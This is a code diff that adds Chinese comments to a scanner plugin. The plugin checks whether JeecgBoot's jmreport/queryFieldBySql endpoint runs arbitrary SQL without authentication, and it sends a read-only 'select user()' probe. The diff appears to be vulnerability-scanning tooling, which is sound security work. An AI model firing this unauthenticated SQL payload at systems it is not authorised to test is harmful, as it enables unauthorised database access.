@@ -33,15 +33,24 @@ class JeecgSqlInjectJmreportPlugin(PluginBase):
     supports_waf_bypass = True
 
     def verify(self, target, session):
+        """检测 /jmreport/queryFieldBySql 是否可未授权执行任意 SQL。
+
+        @param target: 目标站点根 URL
+        @param session: 复用的 HTTP 会话
+        @return: ScanResult —— 命中 CONFIRMED；未命中 SAFE；网络异常 UNKNOWN
+        """
         url = join_url(target, "/jeecg-boot/jmreport/queryFieldBySql")
         try:
+            # 不带鉴权头直连：放行则执行 SQL 返回业务 JSON，被拦截则返回 401/403
             resp = session.post(
                 url,
+                # dbKey=master 指定默认数据源；select user() 为只读探测，不触碰业务数据
                 data='{"sql":"select user()","dbKey":"master"}',
                 headers={"Content-Type": "application/json"},
             )
             text = resp.text or ""
         except Exception as e:
+            # 网络异常归 UNKNOWN：测不到 ≠ 安全，避免漏报
             print(no("JeecgBoot jmreport SQL注入（网络异常）"))
             return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
         # 成功执行：返回业务 JSON（code/result 字段）且非 401/403；或 SQL 报错泄漏
